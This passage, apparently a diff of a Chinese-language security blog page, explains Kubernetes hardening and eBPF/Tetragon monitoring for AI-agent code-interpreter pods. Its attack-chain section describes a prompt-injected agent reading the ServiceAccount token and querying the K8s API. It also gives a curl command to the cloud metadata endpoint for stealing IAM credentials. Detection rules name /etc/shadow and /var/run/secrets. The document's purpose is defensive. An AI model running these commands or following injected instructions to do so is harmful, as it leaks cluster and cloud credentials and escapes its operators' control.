+<li><strong>Pod</strong>：K8s 最小调度单元，一个 Pod 里可以有多个容器，它们共享 network namespace（同一个 IP）和 volumes</li>
+<li><strong>Namespace</strong>：K8s 级别的逻辑隔离（和 Linux namespace 不是一个概念），用于划分资源和权限边界</li>
+<li><strong>Service</strong>：给一组 Pod 提供稳定的访问入口（虚拟 IP + DNS 名），kube-proxy/Cilium 负责流量转发</li>
+<li><strong>ServiceAccount</strong>：Pod 的身份标识，每个 Pod 默认自动挂载一个 SA token，可以用它调用 K8s API</li>
+<li><strong>Admission Controller</strong>：Pod 创建请求到达 apiserver 后、写入 etcd 前的拦截点，可以做变更（Mutating）和校验（Validating）</li>
+</ul>
+</blockquote>
+<h3 id="Q-K8s-和-Docker-有什么区别？"><a href="#Q-K8s-和-Docker-有什么区别？" class="headerlink" title="Q: K8s 和 Docker 有什么区别？"></a>Q: K8s 和 Docker 有什么区别？</h3><blockquote>
+<p>Docker 和 K8s 是不同层次的东西，经常被混淆：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">层次对比：</span><br><span class="line"></span><br><span class="line">Docker（单机容器引擎）：</span><br><span class="line">  用户 → docker CLI → dockerd → containerd → runc → 容器</span><br><span class="line">  只管单台机器上的容器创建、启动、停止</span><br><span class="line"></span><br><span class="line">Kubernetes（容器编排平台）：</span><br><span class="line">  用户 → kubectl → kube-apiserver → scheduler → kubelet → containerd → runc → 容器</span><br><span class="line">  管理成百上千台机器上的容器调度、网络、存储、弹性伸缩、滚动更新</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Docker（单机）</th>
+<th>Kubernetes（集群）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>容器运行时</strong></td>
+<td>dockerd + containerd + runc</td>
+<td>containerd/CRI-O + runc/kata（Docker 已被 K8s 弃用）</td>
+</tr>
+<tr>
+<td><strong>调度</strong></td>
+<td>手动指定在哪台机器运行</td>
+<td>scheduler 自动调度到合适 Node</td>
+</tr>
+<tr>
+<td><strong>网络</strong></td>
+<td>docker0 bridge，默认 NAT</td>
+<td>扁平网络，每个 Pod 有独立 IP，跨 Node 直通</td>
+</tr>
+<tr>
+<td><strong>服务发现</strong></td>
+<td><code>--link</code>（已废弃）或手动</td>
+<td>内置 DNS（CoreDNS），Service 自动注册</td>
+</tr>
+<tr>
+<td><strong>存储</strong></td>
+<td>docker volume，本机</td>
+<td>PV/PVC，支持分布式存储（Ceph、EBS 等）</td>
+</tr>
+<tr>
+<td><strong>安全模型</strong></td>
+<td>Docker socket（root 权限）、seccomp、AppArmor</td>
+<td>RBAC + NetworkPolicy + PSA + Admission Controller + RuntimeClass</td>
+</tr>
+<tr>
+<td><strong>弹性伸缩</strong></td>
+<td>没有</td>
+<td>HPA（按 CPU/内存自动扩缩 Pod 数量）</td>
+</tr>
+<tr>
+<td><strong>滚动更新</strong></td>
+<td>手动 stop + start</td>
+<td>Deployment 自动滚动更新 + 回滚</td>
+</tr>
+</tbody></table>
+<p><strong>K8s 1.24+ 已移除 dockershim</strong>——不再直接支持 Docker 作为容器运行时，改用 containerd 或 CRI-O 通过 CRI（Container Runtime Interface）接口对接。实际运行的还是 runc 创建的容器，只是管理层从 dockerd 变成了 containerd。</p>
+<p><strong>安全层面的关键区别：</strong></p>
+<ul>
+<li>Docker：安全主要依赖 Linux 内核机制（namespace/cgroup/seccomp/LSM），Docker 本身只是管理工具</li>
+<li>K8s：在内核机制之上叠加了集群级安全：RBAC（谁能做什么）、NetworkPolicy（谁能连谁）、Admission Controller（Pod 创建时的策略校验）、Secret 管理等。但 K8s 也引入了新攻击面——apiserver、etcd、kubelet API、ServiceAccount token 等</li>
+</ul>
+</blockquote>
+<h3 id="Q-K8s-中-Pod-安全相关的机制有哪些？"><a href="#Q-K8s-中-Pod-安全相关的机制有哪些？" class="headerlink" title="Q: K8s 中 Pod 安全相关的机制有哪些？"></a>Q: K8s 中 Pod 安全相关的机制有哪些？</h3><blockquote>
+<p><strong>Pod Security Standards（PSS）/ Pod Security Admission（PSA）：</strong><br>K8s 1.25+ 替代了废弃的 PodSecurityPolicy（PSP）。定义三个级别：</p>
+<ul>
+<li><strong>Privileged</strong>：不限制，用于系统级组件（如 DaemonSet 形式的 eBPF agent）</li>
+<li><strong>Baseline</strong>：禁止已知的提权手段（hostNetwork、hostPID、privileged container 等）</li>
+<li><strong>Restricted</strong>：最严格，要求 non-root、drop ALL capabilities、read-only rootfs、禁止 hostPath 等</li>
+</ul>
+<p>对 Agent 的 Code Interpreter Pod，应该使用 <strong>Restricted</strong> 级别。</p>
+<p><strong>其他关键机制：</strong></p>
+<ul>
+<li><strong>RBAC</strong>：控制 ServiceAccount 对 K8s API 的访问。Agent Pod 的 ServiceAccount 应该<strong>零权限</strong></li>
+<li><strong>NetworkPolicy</strong>：限制 Pod 的网络出入。Agent Pod 只允许出站到特定 API endpoint</li>
+<li><strong>ResourceQuota / LimitRange</strong>：限制 namespace 和 Pod 级别的资源</li>
+<li><strong>RuntimeClass</strong>：指定容器运行时（可以为 Agent Pod 指定 Kata/gVisor）</li>
+<li><strong>Admission Controller</strong>：OPA/Gatekeeper 或 Kyverno 自定义策略</li>
+</ul>
+<p><strong>一个 Restricted 级别 Agent Pod 的 securityContext 示例：</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">agent-code-interpreter</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">agent-tenant-a</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">automountServiceAccountToken:</span> <span class="literal">false</span>  <span class="comment"># 不挂载 SA token</span></span><br><span class="line">  <span class="attr">runtimeClassName:</span> <span class="string">kata</span>               <span class="comment"># 使用 Kata 运行时</span></span><br><span class="line">  <span class="attr">securityContext:</span></span><br><span class="line">    <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">runAsUser:</span> <span class="number">1000</span></span><br><span class="line">    <span class="attr">runAsGroup:</span> <span class="number">1000</span></span><br><span class="line">    <span class="attr">fsGroup:</span> <span class="number">1000</span></span><br><span class="line">    <span class="attr">seccompProfile:</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Localhost</span></span><br><span class="line">      <span class="attr">localhostProfile:</span> <span class="string">agent-seccomp.json</span>  <span class="comment"># 自定义 seccomp profile</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">interpreter</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.internal/agent-interpreter:v1.2</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">drop:</span> [<span class="string">&quot;ALL&quot;</span>]       <span class="comment"># 丢弃所有 capabilities</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;4Gi&quot;</span></span><br><span class="line">        <span class="attr">ephemeral-storage:</span> <span class="string">&quot;10Gi&quot;</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">workspace</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/workspace</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">workspace</span></span><br><span class="line">    <span class="attr">emptyDir:</span></span><br><span class="line">      <span class="attr">sizeLimit:</span> <span class="string">5Gi</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp</span></span><br><span class="line">    <span class="attr">emptyDir:</span></span><br><span class="line">      <span class="attr">sizeLimit:</span> <span class="string">1Gi</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="Q-K8s-环境下的攻击路径有哪些？"><a href="#Q-K8s-环境下的攻击路径有哪些？" class="headerlink" title="Q: K8s 环境下的攻击路径有哪些？"></a>Q: K8s 环境下的攻击路径有哪些？</h3><blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">K8s 攻击面全景：</span><br><span class="line"></span><br><span class="line">┌─ Pod 层面</span><br><span class="line">│  ├── 容器逃逸（runc&#x2F;containerd 漏洞、内核漏洞）</span><br><span class="line">│  ├── 特权容器滥用、hostPath 挂载、hostNetwork&#x2F;hostPID</span><br><span class="line">│  └── ServiceAccount token 泄漏 → 调用 K8s API</span><br><span class="line">│</span><br><span class="line">├─ K8s API 层面</span><br><span class="line">│  ├── RBAC 配置不当（过度授权的 ServiceAccount、ClusterRoleBinding 滥用）</span><br><span class="line">│  ├── 匿名访问未禁止（--anonymous-auth&#x3D;true）</span><br><span class="line">│  ├── etcd 未加密&#x2F;未认证 → 读取所有 Secret</span><br><span class="line">│  └── Admission webhook 绕过（webhook 不可用时 failOpen）</span><br><span class="line">│</span><br><span class="line">├─ 网络层面</span><br><span class="line">│  ├── 无 NetworkPolicy → 所有 Pod 间随意通信</span><br><span class="line">│  ├── 访问 metadata API（169.254.169.254）获取云 IAM 凭证</span><br><span class="line">│  ├── 访问 kubelet API（10250 端口）读取 Pod 信息&#x2F;执行命令</span><br><span class="line">│  └── DNS rebinding &#x2F; DNS 重绑定绕过网络策略</span><br><span class="line">│</span><br><span class="line">├─ 供应链</span><br><span class="line">│  ├── 恶意基础镜像 &#x2F; 镜像中的后门</span><br><span class="line">│  ├── 被篡改的 Helm chart（第三方仓库）</span><br><span class="line">│  └── CI&#x2F;CD pipeline 注入（GitHub Actions &#x2F; GitLab CI 凭证窃取）</span><br><span class="line">│</span><br><span class="line">└─ Node 层面</span><br><span class="line">   ├── kubelet 未认证接口（10255 只读端口、10250 读写端口）</span><br><span class="line">   ├── 容器运行时 socket 暴露（&#x2F;var&#x2F;run&#x2F;containerd&#x2F;containerd.sock）</span><br><span class="line">   └── Node 提权后横向移动到同 Node 所有 Pod</span><br></pre></td></tr></table></figure>
+
+<p><strong>对 AI Agent 场景最关键的 3 条攻击链：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">攻击链 1：Agent → SA token → K8s API → 横向移动</span><br><span class="line">  Agent 被 prompt injection</span><br><span class="line">  → 生成代码读取 &#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token</span><br><span class="line">  → 用 token 调用 K8s API（curl https:&#x2F;&#x2F;$KUBERNETES_SERVICE_HOST:443 -H &quot;Authorization: Bearer $TOKEN&quot;）</span><br><span class="line">  → 如果 SA 有权限：列出 Pod、读取其他 namespace 的 Secret、创建特权 Pod</span><br><span class="line">  防御：automountServiceAccountToken: false + RBAC 零权限</span><br><span class="line"></span><br><span class="line">攻击链 2：Agent → metadata API → 云凭证 → 云资源</span><br><span class="line">  Agent 被注入</span><br><span class="line">  → curl http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;</span><br><span class="line">  → 获取 IAM 临时凭证（AccessKeyId + SecretAccessKey + Token）</span><br><span class="line">  → 用凭证访问 S3、RDS、SQS 等云资源</span><br><span class="line">  防御：NetworkPolicy 阻断 169.254.169.254 + IMDS v2（需要 PUT 获取 token）</span><br><span class="line"></span><br><span class="line">攻击链 3：Agent → 内核漏洞 → 容器逃逸 → Node</span><br><span class="line">  Agent 生成的代码触发内核漏洞</span><br><span class="line">  → 获得 host root 权限</span><br><span class="line">  → 读取同 Node 上所有 Pod 的 Secret（&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;pods&#x2F;*&#x2F;volumes&#x2F;）</span><br><span class="line">  → 或者读取 kubelet kubeconfig 获得集群管理权限</span><br><span class="line">  防御：Kata&#x2F;Firecracker 隔离（独立内核）+ 节点最小化</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="Q-如何在-K8s-中部署-eBPF-安全监控？"><a href="#Q-如何在-K8s-中部署-eBPF-安全监控？" class="headerlink" title="Q: 如何在 K8s 中部署 eBPF 安全监控？"></a>Q: 如何在 K8s 中部署 eBPF 安全监控？</h3><blockquote>
+<p><strong>整体架构：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌─── K8s Cluster ───────────────────────────────────────────────────┐</span><br><span class="line">│                                                                    │</span><br><span class="line">│  Node A                           Node B                          │</span><br><span class="line">│  ┌─────────────────────┐          ┌─────────────────────┐         │</span><br><span class="line">│  │ Tetragon Pod        │          │ Tetragon Pod        │         │</span><br><span class="line">│  │ (DaemonSet,         │          │ (DaemonSet,         │         │</span><br><span class="line">│  │  privileged)        │          │  privileged)        │         │</span><br><span class="line">│  │                     │          │                     │         │</span><br><span class="line">│  │ ┌─ 内核 ──────────┐ │          │ ┌─ 内核 ──────────┐ │         │</span><br><span class="line">│  │ │ eBPF progs      │ │          │ │ eBPF progs      │ │         │</span><br><span class="line">│  │ │ (kprobe&#x2F;tp&#x2F;LSM) │ │          │ │ (kprobe&#x2F;tp&#x2F;LSM) │ │         │</span><br><span class="line">│  │ │      │          │ │          │ │      │          │ │         │</span><br><span class="line">│  │ │ ring buffer     │ │          │ │ ring buffer     │ │         │</span><br><span class="line">│  │ └──────┼──────────┘ │          │ └──────┼──────────┘ │         │</span><br><span class="line">│  │        ▼            │          │        ▼            │         │</span><br><span class="line">│  │ 用户态 agent        │          │ 用户态 agent        │         │</span><br><span class="line">│  │ ├ K8s API 查询 Pod  │          │ ├ K8s API 查询 Pod  │         │</span><br><span class="line">│  │ │ 元数据（name,     │          │ │ 元数据            │         │</span><br><span class="line">│  │ │ namespace,labels）│          │ │                   │         │</span><br><span class="line">│  │ ├ 关联 cgroup ID   │          │ ├ 关联 cgroup ID   │         │</span><br><span class="line">│  │ │ → Pod 身份        │          │ │ → Pod 身份        │         │</span><br><span class="line">│  │ └ 输出事件          │          │ └ 输出事件          │         │</span><br><span class="line">│  └────────┬────────────┘          └────────┬────────────┘         │</span><br><span class="line">│           │                                │                      │</span><br><span class="line">│           ▼                                ▼                      │</span><br><span class="line">│  ┌────────────────────────────────────────────┐                   │</span><br><span class="line">│  │         事件聚合层                          │                   │</span><br><span class="line">│  │  Tetragon gRPC API &#x2F; Fluentd &#x2F; OTEL        │                   │</span><br><span class="line">│  │         │                                   │                   │</span><br><span class="line">│  │         ▼                                   │                   │</span><br><span class="line">│  │  ┌─── 存储与分析 ─────────────┐             │                   │</span><br><span class="line">│  │  │ Elasticsearch &#x2F; Loki       │             │                   │</span><br><span class="line">│  │  │ Prometheus (metrics)       │             │                   │</span><br><span class="line">│  │  │ Grafana (可视化)           │             │                   │</span><br><span class="line">│  │  └────────────┬───────────────┘             │                   │</span><br><span class="line">│  │               ▼                             │                   │</span><br><span class="line">│  │  ┌─── 告警与响应 ─────────────┐             │                   │</span><br><span class="line">│  │  │ AlertManager               │             │                   │</span><br><span class="line">│  │  │ Security Analyzer          │             │                   │</span><br><span class="line">│  │  │ (关联 Agent tool call 上下文)│            │                   │</span><br><span class="line">│  │  └────────────────────────────┘             │                   │</span><br><span class="line">│  └────────────────────────────────────────────┘                   │</span><br><span class="line">└──────────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>部署步骤详解：</strong></p>
+<p><strong>Step 1：安装 Tetragon（Helm）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">helm repo add cilium https://helm.cilium.io</span><br><span class="line">helm install tetragon cilium/tetragon -n kube-system \</span><br><span class="line">  --<span class="built_in">set</span> tetragon.btf=/sys/kernel/btf/vmlinux \</span><br><span class="line">  --<span class="built_in">set</span> tetragon.enableProcessCred=<span class="literal">true</span> \</span><br><span class="line">  --<span class="built_in">set</span> tetragon.enableProcessNs=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>这会创建一个 DaemonSet，在每个 Node 上运行一个 Tetragon Pod。</p>
+<p><strong>Step 2：Tetragon Pod 需要的权限</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tetragon DaemonSet 的关键配置（Helm 自动处理）</span></span><br><span class="line"><span class="attr">securityContext:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">true</span>          <span class="comment"># 需要特权才能加载 eBPF 程序</span></span><br><span class="line"><span class="attr">volumeMounts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bpf-maps</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/sys/fs/bpf</span>   <span class="comment"># BPF 文件系统，pin map 用</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cilium-run</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/var/run/cilium</span></span><br><span class="line"><span class="attr">hostPID:</span> <span class="literal">true</span>                <span class="comment"># 需要看到 host 的进程（关联 PID → Pod）</span></span><br></pre></td></tr></table></figure>
+<p>注意：Tetragon 自身是高权限 Pod，是攻击者的高价值目标——需要确保它自身的镜像安全、RBAC 最小化（只需读取 Pod 元数据的权限）。</p>
+<p><strong>Step 3：创建 TracingPolicy（自定义监控规则）</strong></p>
+<p>TracingPolicy 是 Tetragon 的 CRD，定义”hook 哪个函数、看哪些参数、什么条件下触发什么动作”：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例 1：监控 Agent Pod 的文件访问</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">cilium.io/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">TracingPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">agent-file-monitor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">kprobes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">call:</span> <span class="string">&quot;security_file_open&quot;</span>     <span class="comment"># hook LSM 的 file_open</span></span><br><span class="line">    <span class="attr">syscall:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">args:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">&quot;file&quot;</span>                 <span class="comment"># 自动解析文件路径</span></span><br><span class="line">    <span class="attr">selectors:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">matchNamespaces:</span>             <span class="comment"># 只监控容器内（排除 host）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">namespace:</span> <span class="string">Mnt</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">NotIn</span></span><br><span class="line">        <span class="attr">values:</span> [<span class="string">&quot;host_mnt_ns&quot;</span>]</span><br><span class="line">      <span class="attr">matchArgs:</span>                   <span class="comment"># 只关注敏感路径</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">&quot;Prefix&quot;</span></span><br><span class="line">        <span class="attr">values:</span> [<span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/proc/1&quot;</span>, <span class="string">&quot;/var/run/secrets&quot;</span>]</span><br><span class="line">      <span class="attr">matchActions:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">action:</span> <span class="string">Post</span>               <span class="comment"># 记录事件（也可以用 Sigkill 直接杀进程）</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># 示例 2：监控网络连接</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">cilium.io/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">TracingPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">agent-network-monitor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">kprobes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">call:</span> <span class="string">&quot;tcp_connect&quot;</span></span><br><span class="line">    <span class="attr">syscall:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">args:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">&quot;sock&quot;</span>                 <span class="comment"># 自动解析 IP:port</span></span><br><span class="line">    <span class="attr">selectors:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">matchNamespaces:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">namespace:</span> <span class="string">Mnt</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">NotIn</span></span><br><span class="line">        <span class="attr">values:</span> [<span class="string">&quot;host_mnt_ns&quot;</span>]</span><br><span class="line">      <span class="attr">matchActions:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">action:</span> <span class="string">Post</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># 示例 3：阻止容器内执行非白名单二进制</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">cilium.io/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">TracingPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">agent-exec-restrict</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">tracepoints:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">subsystem:</span> <span class="string">&quot;sched&quot;</span></span><br><span class="line">    <span class="attr">event:</span> <span class="string">&quot;sched_process_exec&quot;</span></span><br><span class="line">    <span class="attr">args:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">&quot;string&quot;</span>               <span class="comment"># 可执行文件路径</span></span><br><span class="line">    <span class="attr">selectors:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">matchNamespaces:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">namespace:</span> <span class="string">Mnt</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">NotIn</span></span><br><span class="line">        <span class="attr">values:</span> [<span class="string">&quot;host_mnt_ns&quot;</span>]</span><br><span class="line">      <span class="attr">matchArgs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">        <span class="attr">operator:</span> <span class="string">&quot;NotPrefix&quot;</span>      <span class="comment"># 如果不在白名单前缀内</span></span><br><span class="line">        <span class="attr">values:</span> [<span class="string">&quot;/usr/bin/python3&quot;</span>, <span class="string">&quot;/usr/bin/node&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>]</span><br><span class="line">      <span class="attr">matchActions:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">action:</span> <span class="string">Sigkill</span>            <span class="comment"># 直接杀掉</span></span><br><span class="line">        <span class="attr">rateLimit:</span> <span class="string">1m</span>              <span class="comment"># 限速，避免日志风暴</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 4：事件输出与消费</strong></p>
